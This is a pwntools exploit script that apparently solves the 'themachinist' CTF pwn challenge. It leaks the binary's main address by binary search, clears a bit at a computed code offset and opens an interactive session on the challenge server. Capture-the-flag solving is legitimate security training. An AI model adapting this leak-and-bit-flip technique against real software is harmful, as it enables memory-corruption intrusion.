#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("themachinist_patched")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30022

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
breakrva 0x16f7
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# b1: leak main
# b2: leak target = main + 0x47c
# b3: remove bit [0] from leak target
# b4: trigger

# leak main
sla(b"Enter your choice (1-4): ", b"1")
min = 0x0
max = 0xffffffffffffffff
leaked_main = 0
while True:
    try_main = (min+max)//2
    info(f"try main: {hex(try_main)}")
    sla(b"Enter your sauce recipe: ", str(try_main).encode())
    recv = io.recvline()
    if b"bland" in recv:
        min = try_main
    elif b"overdone" in recv:
        max = try_main
    else:
        leaked_main = try_main
        break

success(f"done 1. leaked main: {hex(leaked_main)}")

# calculate target
target = leaked_main + 0x47c
success(f"done 2. leaked target: {hex(target)}")

# remove bit [0]
sla(b"Enter your choice (1-4): ", b"2")
sla(b"Enter an existing sauce that you want to experiment with: ", hex(target)[2:])
sla(b"Choose an ingredient: ", b"0")
sla(b"Do you want to add or remove the ingredient ('a' to add, 'r' to remove): ", b"r")
success(f"done 3. remove bit [0]")

# trigger
sla(b"Enter your choice (1-4): ", b"3")

io.interactive()

